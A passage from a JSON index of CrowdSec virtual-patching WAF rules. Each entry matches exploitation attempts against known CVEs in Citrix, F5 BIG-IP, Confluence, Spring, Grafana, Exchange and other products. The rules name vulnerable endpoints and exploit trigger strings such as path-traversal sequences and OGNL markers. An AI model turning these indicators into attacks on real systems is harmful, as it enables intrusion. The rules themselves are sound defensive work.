type: equals\n        value: \"file_download\"\n    - zones:\n      - BODY_ARGS\n      variables:\n       - json.get_package_file.site_name\n      match:\n        type: libinjectionSQL\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Citrix SQLi\"\n  classification:\n   - cve.CVE-2019-12989\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-89", "description": "Citrix SQLi (CVE-2019-12989)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2019-12989.yaml", "version": "0.3", "versions": {"0.1": {"digest": "a2f681cb8b762e33a66e63343a9fce32d5416438322ec376946ff78428543714"}, "0.2": {"digest": "a8137b302f6fa55456dcf9cb7e9e9ba11dd878f0b91c90b3910fa4af397e0218"}, "0.3": {"digest": "82b7a57b7fad8c56a0d439ee933debc9272bce8cea2a46ce3177110a57e11bd2"}}}, "crowdsecurity/vpatch-CVE-2019-18935": {"content": "\nname: crowdsecurity/vpatch-CVE-2019-18935\ndescription: \"Telerik - RCE (CVE-2019-18935)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /telerik.web.ui.webresource.axd\n    - zones:\n      - ARGS\n      transform:\n      - lowercase\n      variables:\n      - type\n      match:\n        type: equals\n        value: rau\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Telerik - RCE\"\n  classification:\n   - cve.CVE-2019-18935\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-502", "description": "Telerik - RCE (CVE-2019-18935)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2019-18935.yaml", "version": "0.1", "versions": {"0.1": {"digest": "93b30cdf102f419037c4a34b39770bd47114449aea7a2e43607b410f4400dd5d"}}}, "crowdsecurity/vpatch-CVE-2019-5418": {"content": "## autogenerated on 2025-07-09 14:37:47\nname: crowdsecurity/vpatch-CVE-2019-5418\ndescription: 'Detects Rails file content disclosure via crafted Accept header (CVE-2019-5418)'\nrules:\n  - zones:\n      - HEADERS\n    variables:\n      - accept\n    transform:\n      - lowercase\n      - urldecode\n    match:\n      type: contains\n      value: '../'\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Rails - LFI'\n  classification:\n    - cve.CVE-2019-5418\n    - attack.T1005\n    - cwe.CWE-22\n", "description": "Detects Rails file content disclosure via crafted Accept header (CVE-2019-5418)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2019-5418.yaml", "version": "0.1", "versions": {"0.1": {"digest": "6b7bd715544feb7f9b44f03e5f3f3e3a4619716034ae68c26345cb0eaf38e273"}}}, "crowdsecurity/vpatch-CVE-2020-11738": {"content": "name: crowdsecurity/vpatch-CVE-2020-11738\ndescription: \"Wordpress Snap Creek Duplicator - Path Traversal (CVE-2020-11738)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /wp-admin/admin-ajax.php\n    - zones:\n      - ARGS\n      variables:\n        - action\n      match:\n        type: equals\n        value: duplicator_download\n    - zones:\n      - ARGS\n      variables:\n        - file\n      match:\n        type: contains\n        value: \"..\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Wordpress Snap Creek Duplicator\"\n  classification:\n   - cve.CVE-2020-11738\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-22", "description": "Wordpress Snap Creek Duplicator - Path Traversal (CVE-2020-11738)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2020-11738.yaml", "version": "0.6", "versions": {"0.1": {"digest": "4760198ce14851e3387470bc0270f662b58aa32b8ef1f4217af6818e4f0cedbe"}, "0.2": {"digest": "d939fd479841838064eb205911dd20f35a8070eea2734cf4e0c7bd0c2b5444fe"}, "0.3": {"digest": "d82023967b6e1516519bf0adf7ae5e4d192c19039434267cffd73058f550c2fc"}, "0.4": {"digest": "e73f8dadfeb909e98e3609d0cc098533f2c0351503cabebdf92a43f9d1b3e94c"}, "0.5": {"digest": "b971347e1c948e6a19be6b8641329806b8cbeeaac2f42c0037521831a4629075"}, "0.6": {"digest": "c126f8093c14e959ee0ae591c6e22b912b39fe8ede8004d79aba7dedcc9c970a"}}}, "crowdsecurity/vpatch-CVE-2020-17496": {"content": "name: crowdsecurity/vpatch-CVE-2020-17496\ndescription: \"vBulletin RCE (CVE-2020-17496)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /ajax/render/widget_tabbedcontainer_tab_panel\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - BODY_ARGS\n      variables:\n      - /subwidgets\\[[0-9]+\\]\\[template\\]/\n      match:\n        type: equals\n        value: widget_php\n    - zones:\n      - BODY_ARGS_NAMES\n      match:\n        type: regex\n        value: subWidgets\\[[0-9]+\\]\\[config\\]\\[code\\]\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"vBulletin RCE\"\n  classification:\n   - cve.CVE-2020-17496\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-74", "description": "vBulletin RCE (CVE-2020-17496)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2020-17496.yaml", "version": "0.1", "versions": {"0.1": {"digest": "835df99b26dfcfc6656a6e985ea82966551fae61c61ebb5383bdf9b6dcfa0cd5"}}}, "crowdsecurity/vpatch-CVE-2020-25078": {"content": "## autogenerated on 2025-09-24 14:17:17\nname: crowdsecurity/vpatch-CVE-2020-25078\ndescription: 'Detects unauthorized access to D-Link camera administrator password disclosure endpoint.'\nrules:\n  - and:\n    - zones:\n        - URI\n      transform:\n        - lowercase\n        - urldecode\n      match:\n        type: contains\n        value: '/config/getuser'\n    - zones:\n        - ARGS\n      variables:\n        - 'index'\n      transform:\n        - lowercase\n        - urldecode\n      match:\n        type: regex\n        value: '^[0-9]+$'\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'D-Link - Information Disclosure'\n  classification:\n    - cve.CVE-2020-25078\n    - attack.T1592\n    - cwe.CWE-200\n", "description": "Detects unauthorized access to D-Link camera administrator password disclosure endpoint.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2020-25078.yaml", "version": "0.1", "versions": {"0.1": {"digest": "53c488b9544f5a4defe7bde0c861c31a6ec4dadfebb18b892271762c93aafa47"}}}, "crowdsecurity/vpatch-CVE-2020-5902": {"content": "\nname: crowdsecurity/vpatch-CVE-2020-5902\ndescription: \"F5 BIG-IP TMUI - RCE (CVE-2020-5902)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      - urldecode\n      match:\n        type: contains\n        value: /tmui/login.jsp/..;/tmui/\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"F5 BIG-IP TMUI - RCE\"\n  classification:\n   - cve.CVE-2020-5902\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-22\n", "description": "F5 BIG-IP TMUI - RCE (CVE-2020-5902)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2020-5902.yaml", "version": "0.1", "versions": {"0.1": {"digest": "11fcbe1db693eae83cfd368aace1268cfcc5ae53a6ce4e2c4afbbe43f11a88a9"}}}, "crowdsecurity/vpatch-CVE-2020-9054": {"content": "## autogenerated on 2025-03-28 15:36:18\nname: crowdsecurity/vpatch-CVE-2020-9054\ndescription: 'Detects pre-authentication command injection in Zyxel NAS devices via weblogin.cgi'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /cgi-bin/weblogin.cgi\n      - zones:\n          - ARGS\n        variables:\n          - username\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: \"'\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Zyxel NAS - RCE'\n  classification:\n    - cve.CVE-2020-9054\n    - attack.T1190\n    - cwe.CWE-78\n", "description": "Detects pre-authentication command injection in Zyxel NAS devices via weblogin.cgi", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2020-9054.yaml", "version": "0.1", "versions": {"0.1": {"digest": "ac21a8c04e0a7c875df0dd03363fb10491fd9216b854e3f738b402018325fa36"}}}, "crowdsecurity/vpatch-CVE-2021-22941": {"content": "name: crowdsecurity/vpatch-CVE-2021-22941\ndescription: \"Citrix RCE (CVE-2021-22941)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /upload.aspx\n    - zones:\n      - ARGS\n      variables:\n       - uploadid\n      match:\n        type: contains\n        value: \"..\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Citrix RCE\"\n  classification:\n   - cve.CVE-2021-22941\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-284", "description": "Citrix RCE (CVE-2021-22941)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2021-22941.yaml", "version": "0.3", "versions": {"0.1": {"digest": "994975ada2914e56168b94db4acb5f28293673fcf824d35619d5e35539cf8052"}, "0.2": {"digest": "0057a096e2d27ce5264d9481dd073bf97d7ef9a6b7e3e11785cfd8dde880db56"}, "0.3": {"digest": "10b432dba048130dbea67c24d1f94f84ff0df489dce552fda2cd6c0e76eb6e16"}}}, "crowdsecurity/vpatch-CVE-2021-26086": {"content": "name: crowdsecurity/vpatch-CVE-2021-26086\ndescription: \"Atlassian Jira Server/Data Center 8.4.0 - Limited Remote File Read/Include (CVE-2021-26086)\"\nrules:\n  - or:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /;/web-inf/\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /;/meta-inf/\n\nlabels:\n   type: exploit\n   service: http\n   confidence: 3\n   spoofable: 0\n   behavior: \"http:exploit\"\n   label: \"Atlassian Jira Server/Data Center 8.4.0 File Read\"\n   references:\n    - https://github.com/ColdFusionX/CVE-2021-26086\n    - https://nvd.nist.gov/vuln/detail/CVE-2021-26086\n   classification:\n     - cve.CVE-2021-26086\n     - CWE.22\n     - attack.T1595\n     - attack.T1190", "description": "Atlassian Jira Server/Data Center 8.4.0 - Limited Remote File Read/Include (CVE-2021-26086)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2021-26086.yaml", "version": "0.1", "versions": {"0.1": {"digest": "535e08ea92881b250e16cf917c2817c8e32141b8141630b0a871480b01bab8cd"}}}, "crowdsecurity/vpatch-CVE-2021-26294": {"content": "## autogenerated on 2025-04-23 13:04:53\nname: crowdsecurity/vpatch-CVE-2021-26294\ndescription: 'Detects unauthorized access to AfterLogic Aurora/WebMail Pro WebDAV endpoint using default caldav_public_user credentials and path traversal.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: /dav/server.php/files/personal/\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: '..'\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'AfterLogic Aurora/WebMail Pro - Info Disclosure'\n  classification:\n    - cve.CVE-2021-26294\n    - attack.T1040\n    - cwe.CWE-22\n", "description": "Detects unauthorized access to AfterLogic Aurora/WebMail Pro WebDAV endpoint using default caldav_public_user credentials and path traversal.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2021-26294.yaml", "version": "0.1", "versions": {"0.1": {"digest": "66e61be1a8ddd7b52468d64c5cfcd89a0f0c2cdddb703a815094b828444d5eae"}}}, "crowdsecurity/vpatch-CVE-2021-3129": {"content": "name: crowdsecurity/vpatch-CVE-2021-3129\ndescription: \"Laravel with Ignition Debug Mode RCE (CVE-2021-3129)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /_ignition/execute-solution\n    - zones:\n      - BODY_ARGS\n      variables:\n      - json.parameters.viewFile\n      match:\n        type: regex\n        value: \"php://filter|phar://\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Laravel with Ignition Debug Mode RCE\"\n  classification:\n   - cve.CVE-2021-3129\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-98", "description": "Laravel with Ignition Debug Mode RCE (CVE-2021-3129)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2021-3129.yaml", "version": "0.4", "versions": {"0.1": {"digest": "78803a49055ed71b353ddf43560d700d0b64ebfb172ef6705457f793a9f37b34"}, "0.2": {"digest": "b155e9bbe64b4b44f3c98617c4b3bfedaadcce147e0685290e0d7a8dbdf47108"}, "0.3": {"digest": "60ab3d4c01d7e9cd998134473b7be3899d63af8936227c4d1899cd3008aab53d"}, "0.4": {"digest": "bf67806102345ebd40cbc47dc0494d97b0a7be420302386844650ad28284e74c"}}}, "crowdsecurity/vpatch-CVE-2021-43798": {"content": "## autogenerated on 2025-03-28 15:30:48\nname: crowdsecurity/vpatch-CVE-2021-43798\ndescription: 'Grafana - Arbitrary File Read (CVE-2021-43798)'\nrules:\n  - and:\n    - zones:\n        - URI\n      transform:\n        - lowercase\n      match:\n        type: contains\n        value: /public/plugins/\n    - zones:\n        - URI\n      transform:\n        - lowercase\n      match:\n        type: contains\n        value: '../'\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Grafana - LFI'\n  classification:\n    - cve.CVE-2021-43798\n    - attack.T1190\n    - cwe.CWE-22\n", "description": "Grafana - Arbitrary File Read (CVE-2021-43798)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2021-43798.yaml", "version": "0.4", "versions": {"0.1": {"digest": "882050562bf8d8f19e9893f8af2978c837cca1caa49e1f07f1c7f9139bd0a16e"}, "0.2": {"digest": "c58357970a37b7d0607948652090fb7a0b8411fed6926750a746132648be912b"}, "0.3": {"digest": "0720789b9b4ffe67bc3e270ccfe6fe81cb404357ba0c17eb01a029bbf8ef66ec"}, "0.4": {"digest": "f9c69d4be2b5b2ba27a00134e0a9dcd9186a767b030b1aea6980ebde48bdb7b3"}}}, "crowdsecurity/vpatch-CVE-2021-44529": {"content": "## autogenerated on 2025-03-28 15:45:16\nname: crowdsecurity/vpatch-CVE-2021-44529\ndescription: 'Detects code injection in Ivanti EPM CSA via cookie manipulation (CVE-2021-44529)'\nrules:\n  - and:\n    - zones:\n        - URI\n      transform:\n        - lowercase\n      match:\n        type: equals\n        value: /client/index.php\n    - zones:\n        - HEADERS\n      variables:\n        - Cookie\n      transform:\n        - lowercase\n      match:\n        type: contains\n        value: \"ab=\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Ivanti EPM CSA - RCE'\n  classification:\n    - cve.CVE-2021-44529\n    - attack.T1190\n    - cwe.CWE-94\n", "description": "Detects code injection in Ivanti EPM CSA via cookie manipulation (CVE-2021-44529)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2021-44529.yaml", "version": "0.2", "versions": {"0.1": {"digest": "91655a585000c5e248fbdd158e4ef631443656baef132da50e03057ec915ecc2"}, "0.2": {"digest": "4a2ff3a4aff853d2132081834ce7dd44c38403224add953d13e29e62a2e20174"}}}, "crowdsecurity/vpatch-CVE-2022-1388": {"content": "## autogenerated on 2025-04-23 16:03:44\nname: crowdsecurity/vpatch-CVE-2022-1388\ndescription: 'Detects F5 BIG-IP iControl REST authentication bypass and RCE via crafted POST to /mgmt/tm/util/bash with X-F5-Auth-Token header.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /mgmt/tm/util/bash\n      - zones:\n          - HEADERS_NAMES\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: x-f5-auth-token\n      - zones:\n          - HEADERS_NAMES\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: authorization\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'F5 BIG-IP iControl REST - Authentication Bypass'\n  classification:\n    - cve.CVE-2022-1388\n    - attack.T1190\n    - cwe.CWE-306\n", "description": "Detects F5 BIG-IP iControl REST authentication bypass and RCE via crafted POST to /mgmt/tm/util/bash with X-F5-Auth-Token header.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2022-1388.yaml", "version": "0.1", "versions": {"0.1": {"digest": "bee047430b9bc7f9f5685d1ccd3e151650cec1b59e8c2b1190acbd48ba3f7a74"}}}, "crowdsecurity/vpatch-CVE-2022-22954": {"content": "name: crowdsecurity/vpatch-CVE-2022-22954\ndescription: \"VMWare Workspace ONE Access RCE (CVE-2022-22954)\"\nrules:\n  - and:\n       - zones:\n           - URI\n         transform:\n           - lowercase\n         match:\n           type: contains\n           value: /catalog-portal/ui/oauth/verify\n       - zones:\n           - ARGS\n         variables:\n           - deviceUdid\n         transform:\n           - lowercase\n         match:\n           type: contains\n           value: ${\n\nlabels:\n   type: exploit\n   service: http\n   confidence: 3\n   spoofable: 0\n   behavior: \"http:exploit\"\n   label: \"VMWare Workspace ONE RCE\"\n   references:\n    - https://www.rapid7.com/blog/post/2022/04/29/widespread-exploitation-of-vmware-workspace-one-access-cve-2022-22954/\n    - https://unit42.paloaltonetworks.com/cve-2022-22954-vmware-vulnerabilities/\n    - https://nvd.nist.gov/vuln/detail/cve-2022-22954\n   classification:\n     - cve.CVE-2022-22954\n     - attack.T1595\n     - attack.T1190", "description": "VMWare Workspace ONE Access RCE (CVE-2022-22954)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2022-22954.yaml", "version": "0.2", "versions": {"0.1": {"digest": "e60bbff9098b087dc1d8fa2ccb7007c4d886228344af78ef998b4d73f81e4820"}, "0.2": {"digest": "16face3b32aa6a9a3664f3919f2ae58440ec7ccd2c364156cf9ac8cebcbecb26"}}}, "crowdsecurity/vpatch-CVE-2022-22965": {"content": "name: crowdsecurity/vpatch-CVE-2022-22965\ndescription: \"Spring4Shell - RCE (CVE-2022-22965)\"\nrules:\n  - zones:\n    - RAW_BODY\n    - ARGS_NAMES\n    match:\n      type: contains\n      value: class.module.classLoader.resources.\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Spring4Shell - RCE\"\n  classification:\n   - cve.CVE-2022-22965\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-94\n\n\n", "description": "Spring4Shell - RCE (CVE-2022-22965)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2022-22965.yaml", "version": "0.2", "versions": {"0.1": {"digest": "97303299c1e51bff072ad97376af0f9c1ce3489920c2f5669c728165d52c961e"}, "0.2": {"digest": "68d3b2dda49624c72976f5bc7322c532286ec8a4f45ed2526d1fd880195d3d3b"}}}, "crowdsecurity/vpatch-CVE-2022-25488": {"content": "## autogenerated on 2025-03-26 09:41:25\nname: crowdsecurity/vpatch-CVE-2022-25488\ndescription: 'Atom CMS - SQLi (CVE-2022-25488)'\nrules:\n  - and:\n    - zones:\n        - URI\n      transform:\n        - lowercase\n      match:\n        type: contains\n        value: /admin/ajax/avatar.php\n    - zones:\n        - ARGS\n      variables:\n        - id\n      transform:\n        - lowercase\n      match:\n        type: regex\n        value: '[^0-9-]'\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Atom CMS - SQLi'\n  classification:\n    - cve.CVE-2022-25488\n    - attack.T1190\n    - cwe.CWE-89\n", "description": "Atom CMS - SQLi (CVE-2022-25488)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2022-25488.yaml", "version": "0.4", "versions": {"0.1": {"digest": "7a184ffedf155ae543330cdaf91b49aeb3a5f526e4a4075e2f81b910f5b82f5d"}, "0.2": {"digest": "4e359233743fd9bf321d33f0bd71832dc4561c9b8220f1d27838c9e038f1bc4f"}, "0.3": {"digest": "afd92dcbb5c055dbda87a927c70758ae9856eb495926fc69426897f52105e3fe"}, "0.4": {"digest": "06a04ba66485dd9696e0de292796d0fe19536138746dea73bb4507fc2a383a94"}}}, "crowdsecurity/vpatch-CVE-2022-26134": {"content": "\nname: crowdsecurity/vpatch-CVE-2022-26134\ndescription: \"Confluence - RCE (CVE-2022-26134)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      - urldecode\n      match:\n        type: startsWith\n        value: '/${'\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      - urldecode\n      match:\n        type: contains\n        value: \"@java.lang.runtime\"\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      - urldecode\n      match:\n        type: contains\n        value: \"@org.apache.commons.io.ioutils\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Confluence - RCE\"\n  classification:\n   - cve.CVE-2022-26134\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-917\n", "description": "Confluence - RCE (CVE-2022-26134)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2022-26134.yaml", "version": "0.2", "versions": {"0.1": {"digest": "a9b0e2761039e525b2712566843f6c81f500a8c8fc4c84c3b8bb52c7e92f5986"}, "0.2": {"digest": "643d069b705f12040c3082ad3a9824980c02bb4f2efddf730d87c7856b92e6b9"}}}, "crowdsecurity/vpatch-CVE-2022-27926": {"content": "name: crowdsecurity/vpatch-CVE-2022-27926\ndescription: \"Zimbra Collaboration XSS (CVE-2022-27926)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /public/error.jsp\n    - zones:\n      - ARGS\n      variables:\n      - errCode\n      transform:\n      - lowercase\n      match:\n        type: libinjectionXSS\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Zimbra Collaboration (ZCS) - XSS\"\n  classification:\n   - cve.CVE-2022-27926\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-79", "description": "Zimbra Collaboration XSS (CVE-2022-27926)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2022-27926.yaml", "version": "0.4", "versions": {"0.1": {"digest": "d96237a7ed02eb7aa9df45a684b5cef8f5145e857d10b5260373739668ad63f5"}, "0.2": {"digest": "ba56077560152e4dd0e06c1bc1e6522515142b0ea7a27dff2c0ea289ddaee174"}, "0.3": {"digest": "951e401afc100b54c1151efaea6ae676a95e91eb1ba8503638500695bd607f97"}, "0.4": {"digest": "e2c3a9d82d7362168f27227660a2d35249642843672438545ca5a8eb25d7e4e5"}}}, "crowdsecurity/vpatch-CVE-2022-31499": {"content": "## autogenerated on 2025-08-07 14:40:55\nname: crowdsecurity/vpatch-CVE-2022-31499\ndescription: 'Detects remote command injection in Nortek Linear eMerge E3-Series via ReaderNo parameter.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /card_scan.php\n      - zones:\n          - ARGS\n        variables:\n          - readerno\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: '`'\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Nortek Linear eMerge E3-Series - RCE'\n  classification:\n    - cve.CVE-2022-31499\n    - attack.T1190\n    - cwe.CWE-78\n", "description": "Detects remote command injection in Nortek Linear eMerge E3-Series via ReaderNo parameter.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2022-31499.yaml", "version": "0.1", "versions": {"0.1": {"digest": "30225ae2402cf973d0453280a36dde3b63f46adf96bbd7d7df1fefccd08dfa82"}}}, "crowdsecurity/vpatch-CVE-2022-35914": {"content": "name: crowdsecurity/vpatch-CVE-2022-35914\ndescription: \"GLPI RCE (CVE-2022-35914)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /vendor/htmlawed/htmlawed/htmlawedtest.php\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"GLPI RCE\"\n  classification:\n   - cve.CVE-2022-35914\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-74", "description": "GLPI RCE (CVE-2022-35914)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2022-35914.yaml", "version": "0.5", "versions": {"0.1": {"digest": "6a04ea781b27eb568a1752e3e310ef59532f803fed829010fb5cf76225454bc5"}, "0.2": {"digest": "ef4c9225bcfcc942fa5db2568a99af628cf578249b4a7477e0889f16d3ef4111"}, "0.3": {"digest": "e1213758c850424b37cb6ff6360fc1e1a2f12af9284d77766b06ee8c58679656"}, "0.4": {"digest": "dca2dbd76392b220f527732266fd7b39b16e23cd7ec72665f022598325fc7988"}, "0.5": {"digest": "ec12df461c9066584779c55e88d51a40f9e29b90a5b7f65f074a07af1584bbe5"}}}, "crowdsecurity/vpatch-CVE-2022-38627": {"content": "## autogenerated on 2025-10-01 14:02:41\nname: crowdsecurity/vpatch-CVE-2022-38627\ndescription: 'Detects SQL injection vulnerability in Linear eMerge E3-Series via idt parameter'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: '/badging/badge_template_print.php'\n      - zones:\n          - ARGS\n        variables:\n          - idt\n        match:\n          type: regex\n          value: '[^0-9]'\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Linear eMerge E3-Series - SQLI'\n  classification:\n    - cve.CVE-2022-38627\n    - attack.T1190\n    - cwe.CWE-89\n", "description": "Detects SQL injection vulnerability in Linear eMerge E3-Series via idt parameter", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2022-38627.yaml", "version": "0.1", "versions": {"0.1": {"digest": "afba740e5460988af391874207696db206ae83bdd8fc246ff14a126968203f9c"}}}, "crowdsecurity/vpatch-CVE-2022-41082": {"content": "\nname: crowdsecurity/vpatch-CVE-2022-41082\ndescription: \"Microsoft Exchange - RCE (CVE-2022-41082)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /autodiscover/autodiscover.json\n    - zones:\n      - URI_FULL\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: \"powershell\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Microsoft Exchange - RCE\"\n  classification:\n   - cve.CVE-2022-41082\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-502", "description": "Microsoft Exchange - RCE (CVE-2022-41082)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2022-41082.yaml", "version": "0.1", "versions": {"0.1": {"digest": "7d78268b23b167044803a98e1ee57b6075a260fbc341d7106edd2978d9bbdb27"}}}, "crowdsecurity/vpatch-CVE-2022-44877": {"content": "name: crowdsecurity/vpatch-CVE-2022-44877\ndescription: \"CentOS Web Panel 7 RCE (CVE-2022-44877)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /login/index.php\n    - zones:\n      - ARGS\n      variables:\n      - login\n      match:\n        type: regex\n        value: \"[^a-zA-Z0-9_.-]+\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"CentOS Web Panel 7 RCE\"\n  classification:\n   - cve.CVE-2022-44877\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-78", "description": "CentOS Web Panel 7 RCE (CVE-2022-44877)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2022-44877.yaml", "version": "0.2", "versions": {"0.1": {"digest": "3c6baf947b513098784bb4cb9d03c2e19483dd48a7660db55ee77872dd903132"}, "0.2": {"digest": "717fe0d16947d200c0f9142ca667618c3984037f0775fda609326a87f90357d8"}}}, "crowdsecurity/vpatch-CVE-2022-46169": {"content": "name: crowdsecurity/vpatch-CVE-2022-46169\ndescription: \"Cacti RCE (CVE-2022-46169)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /remote_agent.php\n    - zones:\n      - ARGS\n      variables:\n      - poller_id\n      match:\n        type: regex\n        value: \"[^a-zA-Z0-9_]\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Cacti <=1.2.22 - RCE\"\n  classification:\n   - cve.CVE-2022-46169\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-74\n   - cwe.CWE-77\n   - cwe.CWE-78\n   - cwe.CWE-863", "description": "Cacti RCE (CVE-2022-46169)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2022-46169.yaml", "version": "0.5", "versions": 